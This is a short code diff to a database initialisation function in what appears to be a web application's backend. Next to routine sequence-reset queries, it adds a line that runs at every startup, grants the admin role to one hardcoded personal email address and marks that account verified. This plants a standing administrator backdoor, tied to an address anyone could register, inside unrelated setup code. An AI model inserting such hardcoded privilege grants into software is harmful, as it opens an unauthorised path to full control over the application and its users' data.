@@ -181,6 +181,9 @@ export async function getDb() {
     // Reset SERIAL sequences to prevent duplicate key violations on auto-increment inserts
     await dbInstance.pool.query("SELECT setval(pg_get_serial_sequence('users', 'id'), COALESCE(MAX(id), 1)) FROM users");
     await dbInstance.pool.query("SELECT setval(pg_get_serial_sequence('monitors', 'id'), COALESCE(MAX(id), 1)) FROM monitors");
+
+    // Promote chandchv@gmail.com to superuser/admin role if registered
+    await dbInstance.run("UPDATE users SET role = 'admin', is_verified = 1 WHERE email = 'chandchv@gmail.com'");
   } catch (err) {
     dbInstance = null;
     throw err;
